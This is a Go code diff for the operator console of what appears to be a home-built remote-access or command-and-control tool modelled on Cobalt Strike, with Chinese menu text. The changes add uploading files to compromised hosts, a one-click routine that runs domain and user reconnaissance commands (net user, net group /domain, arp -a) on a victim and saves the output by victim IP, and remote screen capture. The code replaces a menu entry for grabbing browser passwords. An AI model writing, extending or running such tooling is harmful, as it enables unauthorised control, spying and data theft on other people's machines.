@@ -5,9 +5,11 @@ import (
 	"My-Comment/cobalt.tcp"
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
 	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -131,8 +133,9 @@ func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 	fmt.Printf("2. 主机信息搜集\n")
 	fmt.Printf("3. 域信息搜集\n")
 	fmt.Printf("4. 执行cmd指令\n")
-	fmt.Printf("5. 文件浏览及下载\n")
-	fmt.Printf("6. 一键获取浏览器密码\n")
+	fmt.Printf("5. 文件浏览及上传下载\n")
+	fmt.Printf("6. 一键打包信息搜集\n")
+	fmt.Printf("7. 截取屏幕\n")
 	//fmt.Printf("7. 刷新\n")
 	fmt.Printf("按0返回主界面\n")
 	fmt.Printf("\n请输入选项:  ")
@@ -141,14 +144,15 @@ func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 	}
 	for {
 		okNum, err := fmt.Scanf("%d", &num)
-		if err != nil || okNum != 1 || num < 0 || num > 6 {
+		if err != nil || okNum != 1 || num < 0 || num > 7 {
 			//错误检测
 			fmt.Printf("1. 刷新\n")
 			fmt.Printf("2. 主机信息搜集\n")
 			fmt.Printf("3. 域信息搜集\n")
 			fmt.Printf("4. 执行cmd指令\n")
-			fmt.Printf("5. 文件浏览及下载\n")
-			fmt.Printf("6. 一键获取浏览器密码\n")
+			fmt.Printf("5. 文件浏览及上传下载\n")
+			fmt.Printf("6. 一键打包信息搜集\n")
+			fmt.Printf("7. 截取屏幕\n")
 			//fmt.Printf("7. 刷新\n")
 			fmt.Printf("按0返回主界面\n")
 			fmt.Printf("\n请输入选项:  ")
@@ -170,6 +174,9 @@ func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 	case 5:
 		FileDeal(id)
 	case 6:
+		AllInfo(id)
+	case 7:
+		Watch(id)
 	case 0:
 		return
 
@@ -331,6 +338,8 @@ func FileDeal(id int) {
 		case "dir":
 			if abslsentPath != "" {
 				hosts.Chans <- "Documentdir " + abslsentPath
+			} else {
+				fmt.Println("当前路径为空")
 			}
 		case "cd":
 			if relativePath == ".." {
@@ -369,9 +378,9 @@ func FileDeal(id int) {
 			hosts.Chans <- path
 		case "get":
 			hosts.Chans <- "Documentget " + abslsentPath + "/" + relativePath
-			hosts.ChansBack <- relativePath
+			hosts.ChansFileName <- relativePath
 		case "del":
-			hosts.Chans <- "Documentdel " + abslsentPath + relativePath
+			hosts.Chans <- "Documentdel " + abslsentPath + "/" + relativePath
 		case "put":
 			//hosts.Chans <- "Documentput " + abslsentPath
 			Fileput(abslsentPath, id)
@@ -379,24 +388,37 @@ func FileDeal(id int) {
 			hosts.Chans <- "Documentquit"
 			return
 		default:
-			fmt.Printf("help\n")
+			DocumentHelp()
 			//help
 		}
 		//time.Sleep(1000)
 	}
 
 }
+func DocumentHelp() {
+	fmt.Println("1.进入目录：cd ”目录“ or “..”")
+	fmt.Println("2.查看当前目录：dir")
+	fmt.Println("3.在当前文件夹下获得文件：get “文件名称”")
+	fmt.Println("4.在当前文件夹下发送文件：先”put“  然后输入本地要发送文件位置")
+	fmt.Println("5.删除当前文件夹下文件：del “文件名称”")
+}
 func Fileput(AimPath string, id int) {
 
-	var lens string
+	var lens int64
 	var err1 error
 	var file []byte
 BEGIN:
 	fmt.Println("输入要传输的本地文件：")
-	fmt.Println(" 按0退出")
+	fmt.Println(" 按quit退出")
 	localPath := ""
+	if Computer == "windows" {
+		fmt.Scanf("%s", &localPath)
+	}
 	fmt.Scanf("%s", &localPath)
-	if localPath == "0" {
+	if DEBUG {
+		fmt.Printf("输入的路径：%s\n", localPath)
+	}
+	if strings.Index(localPath, "quit") == 0 {
 		return
 	}
 
@@ -410,7 +432,7 @@ BEGIN:
 	reg := regexp.MustCompile(regstring)
 	AimName := reg.ReplaceAllString(localPath, ``)
 	cobalt_tcp.IpChanMap[id].Chans <- "Documentput " + AimPath + "/" + AimName
-	cobalt_tcp.IpChanMap[id].Chans <- "Document" + lens
+	cobalt_tcp.IpChanMap[id].Chans <- "Document" + strconv.FormatInt(lens, 10)
 	cobalt_tcp.IpChanMap[id].Chans <- "Document" + string(file)
 
 	if DEBUG {
@@ -420,4 +442,79 @@ BEGIN:
 	fmt.Printf("文件发送完成\n")
 
 	//fmt.Printf("fileput")
+}
+func AllInfo(id int) {
+	dirname := cobalt_tcp.IpChanMap[id].Ip
+	err := os.Mkdir(dirname, 0755)
+	if err != nil {
+		fmt.Println("创建父文件夹失败")
+		log.Println(err)
+		return
+	}
+	err1 := os.Mkdir(dirname+"/"+"用户信息", 0755)
+	if err1 != nil {
+		fmt.Println("创建子文件夹1失败")
+		log.Println(err1)
+		return
+	}
+	err2 := os.Mkdir(dirname+"/"+"域信息", 0755)
+	if err2 != nil {
+		fmt.Println("创建子文件夹2失败")
+		log.Println(err2)
+		return
+	}
+	allUserCmd := map[string]string{
+		//"当前进程":"wmic process list brief",
+		"所有用户":  "net user",
+		"本地管理员": "net localgroup administrators",
+		//"主机ip信息": "ipconfig /all",
+		"路由表": "route print",
+		//"本机服务": "wmic service list brief",
+	}
+
+	allDomainCmd := map[string]string{
+
+		"域的名字": "net config workstation",
+		//"域列表":    "net view /domain",
+		"域用户组列表": "net group /domain",
+		"存活主机":   "arp -a",
+		"所属域":    "net config Workstation",
+	}
+	langCmd := "Cmd\r\n"
+	//cobalt_tcp.WriteCmd()      //进入写入模式
+	//defer cobalt_tcp.ReadCmd() //关闭写入模式
+	//i := len(allDomainCmd) + len(allUserCmd)
+	//var strs []string
+	//for j := 0; j < i; j++ {
+	//	strs = append(strs, "a")
+	//}
+	//text1 := strings.Join(strs, "")
+	//cobalt_tcp.IpChanMap[id].ChansFileName <- text1
+	for name, cmd := range allUserCmd { //用来写入用户信息
+		filename := dirname + "/用户信息/" + name
+		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
+		langCmd = langCmd + cmd + "#"
+
+	}
+	for name, cmd := range allDomainCmd {
+		filename := dirname + "/域信息/" + name
+		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
+		langCmd = langCmd + cmd + "#"
+
+	}
+	cobalt_tcp.IpChanMap[id].Chans <- langCmd[:len(langCmd)-1]
+	//cobalt_tcp.IpChanMap[id].ChansFileName <- "###"
+	//<-cobalt_tcp.IpChanMap[id].ChansBack2
+	//if DEBUG {
+	//	fmt.Printf("结束一键执行\n")
+	//}
+
+}
+func Watch(id int) {
+
+	cmd := "Watch\r\n"
+	name := cobalt_tcp.IpChanMap[id].Ip + "_" + time.Now().Format("01_02_15_04_05") + ".jpg"
+	cobalt_tcp.IpChanMap[id].ChansFileName <- name
+	cobalt_tcp.IpChanMap[id].Chans <- cmd
+	fmt.Printf("等待接受图片\n")
 }
